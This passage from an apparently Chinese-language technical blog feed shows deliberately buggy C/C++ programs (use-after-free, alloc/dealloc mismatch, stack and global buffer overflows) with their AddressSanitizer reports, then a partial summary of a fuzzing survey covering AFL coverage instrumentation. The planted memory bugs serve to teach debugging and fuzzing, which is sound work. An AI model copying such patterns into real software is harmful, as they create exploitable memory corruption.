class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025245 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1245)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: heap-use-after-free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  <span class="hljs-number">0</span>x0c167fff7fc0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fd0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fe0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7ff0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff8000: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd<br>=&gt;<span class="hljs-number">0</span>x0c167fff8010: fd fd fd fd fd fa fa fa fa fa fa fa fa fa[fd]fd<br>  <span class="hljs-number">0</span>x0c167fff8020: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow <span class="hljs-keyword">byte</span> legend (one shadow <span class="hljs-keyword">byte</span> represents <span class="hljs-number">8</span> application bytes):<br>  Addressable:           <span class="hljs-number">00</span><br>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span> <br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after <span class="hljs-keyword">return</span>:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==<span class="hljs-number">3573</span>==ABORTING<br></code></pre></td></tr></table></figure><p>asan 明确地指出了发生错误及地址是<code>AddressSanitizer: heap-use-after-free on address 0x60b0000000f0 </code></p><p>这个地址是在被释放的区域内<code>0x60b0000000f0 is located 0 bytes inside of 100-byte region [0x60b0000000f0,0x60b000000154)freed by thread T0 here</code></p><h2 id="分配释放不匹配"><a href="#分配释放不匹配" class="headerlink" title="分配释放不匹配"></a>分配释放不匹配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// bad_delete.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *cstr = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">strcpy</span>(cstr, <span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; cstr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><br>    delete cstr;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该程序分配内存时使用的是<code>new[]</code>而释放时使用的不是<code>delete[]</code>，造成释放不完全。</p><p>其错误信息是</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino">=================================================================<br>==<span class="hljs-number">2180936</span>==ERROR: AddressSanitizer: alloc-dealloc-<span class="hljs-built_in">mismatch</span> (<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span> [] vs <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>) on <span class="hljs-number">0x60b0000000f0</span>     <span class="hljs-comment">// 1</span><br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877cc65</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe33f</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">10</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0x55d09d3fe20d</span> in _start (/home/chenbing/Code/test/bad_delete+<span class="hljs-number">0x120d</span>)<br><br><span class="hljs-number">0x60b0000000f0</span> is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-type">byte</span> region [<span class="hljs-number">0x60b0000000f0</span>,<span class="hljs-number">0x60b000000154</span>)       <span class="hljs-comment">// 2</span><br>allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877b787</span> in <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">107</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe2e5</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">6</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br><br>SUMMARY: AddressSanitizer: alloc-dealloc-mismatch ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<br>==<span class="hljs-number">2180936</span>==HINT: <span class="hljs-keyword">if</span> you don<span class="hljs-number">&#x27;</span>t care about these errors you may set ASAN_OPTIONS=alloc_dealloc_mismatch=<span class="hljs-number">0</span><br>==<span class="hljs-number">2180936</span>==ABORTING<br></code></pre></td></tr></table></figure><p>错误类型：<code>alloc-dealloc-mismatch</code>,地址为<code>0x60b0000000f0</code></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">int</span> stack_array[<span class="hljs-number">100</span>];<br>    stack_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在栈伤创建了大小为100字节的数组，但在超过其范围的地方进行写入1</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs tap">~/Code/test$ g++ sbo.c -o sbo -fsanitize=address -g<br>chenbing@GreatDB-CB:~/Code/test$ ./sbo <br>=================================================================<br>==2196928==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc33777f24 at pc 0x562dccb592b6 bp 0x7ffc33777d40 sp 0x7ffc33777d30    1)<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x7ffc33777f24 thread T0<br>    <span class="hljs-comment">#0 0x562dccb592b5 in main /home/chenbing/Code/test/sbo.c:6</span><br>    <span class="hljs-comment">#1 0x7f45bf52d082 in __libc_start_main ../csu/libc-start.c:308</span><br>    <span class="hljs-comment">#2 0x562dccb5910d in _start (/home/chenbing/Code/test/sbo+0x110d)</span><br><br>Address 0x7ffc33777f24 is located in stack of thread T0 at offset<span class="hljs-number"> 452 </span>in frame    2)<br>    <span class="hljs-comment">#0 0x562dccb591d8 in main /home/chenbing/Code/test/sbo.c:4</span><br><br>  This frame has<span class="hljs-number"> 1 </span>object(s):     3)<br>    [48, 448) &#x27;stack_array&#x27; (line 5) &lt;== Memory access at offset<span class="hljs-number"> 452 </span>overflows this variable<br>HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork  4)<br>      (longjmp and C++ exceptions *are* supported)<br>SUMMARY: AddressSanitizer: stack-buffer-overflow /home/chenbing/Code/test/sbo.c:6 in main<br>Shadow bytes around the buggy address:    5)<br>  0x1000066e6f90:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fa0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 f1 f1 f1 f1<br>  0x1000066e6fb0: f1 f1<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x1000066e6fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f3]f3 f3 f3 f3 f3 f3 f3<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7000:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7010:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7020:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7030:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASAN internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==2196928==ABORTING<br></code></pre></td></tr></table></figure><p>非常明确的指出了是<code>stack-buffer-overflow</code><br>栈中数组可访问的范围是<code>[48, 448)</code>,但程序访问了 452 处，故故障。</p><h2 id="全局缓冲区溢出"><a href="#全局缓冲区溢出" class="headerlink" title="全局缓冲区溢出"></a>全局缓冲区溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> global_array[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  global_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3701==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55633ad321b4 at pc 0x55633ad2f216 bp 0x7ffff739eca0 sp 0x7ffff739ec90<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x55633ad321b4 thread T0<br>    <span class="hljs-comment">#0 0x55633ad2f215 in main (/home/stre/Desktop/gl+0x1215)</span><br>    <span class="hljs-comment">#1 0x7f5a1ea1dfcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#2 0x7f5a1ea1e07c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#3 0x55633ad2f104 in _start (/home/stre/Desktop/gl+0x1104)</span><br><br>0x55633ad321b4 is located<span class="hljs-number"> 4 </span>bytes to the right of global variable &#x27;global_array&#x27; defined in &#x27;gl.c:4:5&#x27; (0x55633ad32020) of size 400<br>SUMMARY: AddressSanitizer: global-buffer-overflow (/home/stre/Desktop/gl+0x1215) in main<br>Shadow bytes around the buggy address:<br>  0x0aace759e3e0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e3f0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e400:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e410:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e420:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0aace759e430:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f9]f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e440: f9 f9 f9 f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e450:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e460:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e470:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e480:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3701==ABORTING<br></code></pre></td></tr></table></figure><p>与其他溢出报错并无太大差别。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing A Survey</title>
    <link href="/2023/03/02/Fuzzing-A-Survey/"/>
    <url>/2023/03/02/Fuzzing-A-Survey/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing-a-survey"><a href="#Fuzzing-a-survey" class="headerlink" title="Fuzzing a survey"></a>Fuzzing a survey</h1><h2 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h2><ul><li>静态分析（Static analysis)：静态分析针对代码中的词汇、语义等漏洞，但缺乏正确率，即分析静态分析软件给出的信息，也需要话很多时间（高误报率）；</li><li>动态分析（Dynamic analysis)：动态分析针对运行中的程序，但效率低下，需要很大程度的人类参与，且对分析员要求很高；</li><li>符号执行（Symbolic execution)：符号执行对于大规模项目十分效率低下；</li><li>Fuzzing：可应对大规模程序，缺点是低效率与低代码覆盖率。</li></ul><h2 id="2-Fuzzing"><a href="#2-Fuzzing" class="headerlink" title="2.Fuzzing"></a>2.Fuzzing</h2><ul><li>输入文件越破碎越好，这样运行的程序更可能被打败；</li><li>输入可以是多种形式的：网络数据，各种格式的文件，可执行二进制数据等；</li></ul><p><strong>Fuzzing的执行</strong><br>Fuzzing过程中，会对发生的，感兴趣的exception，crashes，violations进行记录。随后可用各种二进制分析软件进行对crashes的分析，如<code> IDA Pro</code>,<code>GDB</code>等等。</p><ul><li>两种Fuzzer<ul><li>基于生成的fuzzer：更熟悉文件格式，能精准生成代码，更容易突破文件验证，测试更深层次的代码，当文件不友好时，分析文件格式很困难。</li><li>基于异变的fuzzer： 更简单地开始测试，需要一串有效的初始输入。</li></ul></li></ul><ul><li><p>基于依赖源码等级分类</p><ul><li>white box:需要源码，文件内的信息进行fuzz；</li><li>gray box:无需源码，通过运行分析程序获取部分内部信息；</li><li>black box:无需源码，不需要任何程序内部信息。</li></ul></li><li><p>dumb fuzzer 和 smart fuzzer：</p><ul><li>前者更注重速度，不回收信息；</li><li>后者会回收信息，优化异变策略，优化输入 。</li></ul></li></ul><p>Fuzzing目前遇到的挑战：</p><ul><li><p>The challenge of  <strong>how to mutate</strong>  seed inputs. </p><ul><li>如何变异/生成样例使其能涵盖更多路径、更容易触发bug；</li><li>何处变异，如何变异是重点；</li><li>即盲目异变是浪费时间，精准的变异策略才是解决问题的关键。</li></ul></li><li><p>The challenge of low <strong>code coverage</strong>.</p><ul><li>更高的覆盖率意味着更高的发现bug概率；</li><li>利用程序分析，达到更高的覆盖率。</li></ul></li><li><p>The challenge of <strong>passing the validation</strong>.</p><ul><li>许多程序都有输入检测，不符合规范则不予执行；</li><li>灰盒与黑盒程序对内部认证方式不清楚，很难绕过检测，于是效率低下。</li></ul></li></ul><h2 id="3-Coverage-based-Fuzzing"><a href="#3-Coverage-based-Fuzzing" class="headerlink" title="3.Coverage-based Fuzzing"></a>3.Coverage-based Fuzzing</h2><p><strong>Code coverage counting</strong></p><ul><li><p>最先进的方法把基本块（basic blocks）作为粒度</p><ul><li>基本块是程序执行时最小的相关单元；</li><li>测量函数或者指令会导致信息缺失或冗余；</li><li>BB可以用首地址辨认，且BB的信息可以轻松通过代码检测提取。</li></ul></li><li><p>两种测量选择： </p><ul><li> 仅计算运行的 BB 数量；</li><li> 以及计算 BB 间转换次数；</li></ul></li><li><p>前者测量顶点（vertices），后者测量边（edge）；  </p></li></ul><p><strong>以AFL为例，介绍边（edge）测量</strong></p><ul><li>有源码时：在编译生成二进制文件时，插入桩，为检测做准备；</li><li>无源码时：将基本块转换为 TCG 块时插桩。</li></ul><p>列举一段插桩代码</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs c">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem [ cur_location ^ prec_location]++;<br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>cur_location 是随机生成的 ID ，而 shared_mem 是一块 64KB 的共享内存，每一个字节都标识着一个独特的边。<br>当一个 BB 间跳转发生时，会计算一个哈希值，然后当前哈希值对应的 bitmap 中的数据会被更新。如下图</p><p><strong>Working process of coverage-based fuzzing</strong><br>主循环内，程序挑选 interesting 种子进行变异、程序生成。目标程序执行这些生成的 testcases，发生 crash 的目标程序会被收集下来，其他感兴趣的样例会被放入种子池。<br>在 <strong>覆盖率引导</strong> 的 fuzzing 内，触发了新路径的程序，会被认为是 <strong>interesting</strong></p><p>Fuzzing 过程中，我们主要关注 覆盖率 和 程序违规 。<br>前者可由之前插桩代码来统计；<br>后者可在 sanitizer 